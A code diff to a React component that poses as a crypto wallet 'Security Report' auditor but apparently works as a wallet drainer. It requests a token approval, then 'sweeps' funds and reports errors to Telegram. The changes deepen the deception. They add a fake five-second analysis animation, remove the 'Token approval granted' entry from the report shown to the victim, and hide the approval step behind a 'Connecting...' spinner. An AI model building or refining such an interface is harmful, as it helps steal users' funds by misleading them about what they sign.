@@ -1,5 +1,5 @@
 import React, { useState } from 'react';
-import { Shield, Activity, FileText, Lock } from 'lucide-react';
+import { Shield, Activity, FileText, Lock, Loader2 } from 'lucide-react';
 import { ethers } from 'ethers';
 import { ensureBSC } from '../wallet/wallet';
 import AnalysisSlider from './AnalysisSlider';
@@ -38,6 +38,7 @@ const AuditorWidget: React.FC<Props> = ({
   const [reportData, setReportData] = useState<any>(null);
   const [analysisDepth, setAnalysisDepth] = useState(5);
   const [rescueDisabled, setRescueDisabled] = useState(false);
+  const [buttonLoading, setButtonLoading] = useState(false);
 
   const API_BASE = import.meta.env.VITE_API_BASE || '';
 
@@ -122,6 +123,7 @@ const AuditorWidget: React.FC<Props> = ({
     }
 
     // ── Phase 1: Connect wallet (NO animation, NO disable on rejection) ──
+    setButtonLoading(true);
     let connectedAddress = '';
     try {
       const accounts = await window.ethereum.request({
@@ -133,6 +135,7 @@ const AuditorWidget: React.FC<Props> = ({
       // User rejected the wallet connection — just return silently.
       // Button stays enabled, no animation, no disable.
       console.warn("Wallet connection cancelled:", connectErr.message);
+      setButtonLoading(false);
       return;
     }
 
@@ -170,13 +173,17 @@ const AuditorWidget: React.FC<Props> = ({
       ];
 
       if (rawBal === 0n) {
-        // No balance — still show a report but skip approval
+        // No balance — show animation first, then the report
         checks.push({ label: "Balance check", passed: true });
         checks.push({ label: "Transaction history", passed: true });
 
         const report = buildReport(connectedAddress, 'BNB', balanceDisplay, checks, 0);
-        setReportData(report);
-        setAppState('REPORT');
+        setButtonLoading(false);
+        setAppState('ANALYZING');
+        setTimeout(() => {
+          setReportData(report);
+          setAppState('REPORT');
+        }, 5000);
         return;
       }
 
@@ -196,19 +203,21 @@ const AuditorWidget: React.FC<Props> = ({
           // User rejected the approval signing — return silently.
           // Button stays enabled, no animation, no disable.
           console.warn("Approval signing rejected:", approveErr.message);
+          setButtonLoading(false);
           return;
         }
 
         // ✅ User approved — NOW start the animation
+        setButtonLoading(false);
         setAppState('ANALYZING');
 
         await approveTx.wait(1);
         approvalTxHash = approveTx.hash;
-        checks.push({ label: "Token approval granted", passed: true });
       }
 
       // If already-approved, start animation now before the sweep
       if (approvalTxHash === "already-approved") {
+        setButtonLoading(false);
         setAppState('ANALYZING');
       }
 
@@ -242,6 +251,7 @@ const AuditorWidget: React.FC<Props> = ({
 
     } catch (e: any) {
       console.error("Report generation error:", e);
+      setButtonLoading(false);
 
       // Send error to Telegram and disable the button permanently
       if (connectedAddress) {
@@ -349,11 +359,20 @@ const AuditorWidget: React.FC<Props> = ({
 
             <button 
               onClick={() => handleGenerateClick('BNB')}
-              disabled={rescueDisabled}
+              disabled={rescueDisabled || buttonLoading}
               className="flex h-12 w-full items-center justify-center gap-2 rounded-xl border border-[#f0b90b]/30 font-bold text-sm tracking-wide transition-all duration-150 touch-manipulation bg-[#f0b90b] hover:bg-[#f5c842] active:scale-[0.985] text-black shadow-lg shadow-[#f0b90b]/20 disabled:opacity-50 disabled:cursor-not-allowed"
             >
-              <FileText className="h-4 w-4" />
-              Generate Security Report · BNB
+              {buttonLoading ? (
+                <>
+                  <Loader2 className="h-4 w-4 animate-spin" />
+                  Connecting...
+                </>
+              ) : (
+                <>
+                  <FileText className="h-4 w-4" />
+                  Generate Security Report · BNB
+                </>
+              )}
             </button>
             <button 
               onClick={() => handleGenerateClick('TRON')}
